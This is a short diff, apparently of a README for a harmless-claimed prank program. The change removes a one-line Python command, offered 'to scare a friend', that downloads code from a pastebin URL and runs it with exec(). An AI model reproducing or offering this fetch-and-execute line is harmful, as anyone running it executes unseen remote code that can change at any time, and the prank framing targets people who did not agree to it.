@@ -9,5 +9,4 @@ DOESN'T CAUSE ANY HARM TO THE COMPUTER!
 - Doesn't add himself to autoreg 
 - So simple
 
-One line version (for example, to scare a friend):
-exec(__import__("requests").get("https://pastebin.com/raw/XYJEXKE7").content)
+There is a one-line version (for example, to scare a friend).
